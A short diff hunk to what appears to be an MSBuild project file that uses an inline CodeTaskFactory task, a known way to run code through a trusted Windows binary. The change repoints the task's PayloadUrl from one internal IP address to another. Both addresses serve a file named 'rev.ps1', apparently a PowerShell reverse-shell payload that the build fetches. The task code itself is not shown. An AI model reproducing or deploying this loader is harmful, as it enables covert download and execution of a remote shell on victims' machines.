@@ -11,7 +11,7 @@
     </ItemGroup>
 
     <Target Name="Hello">
-      <ClassExample PayloadUrl="http://192.168.88.176/rev.ps1" />
+      <ClassExample PayloadUrl="http://172.16.10.7/rev.ps1" />
     </Target>
 
     <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
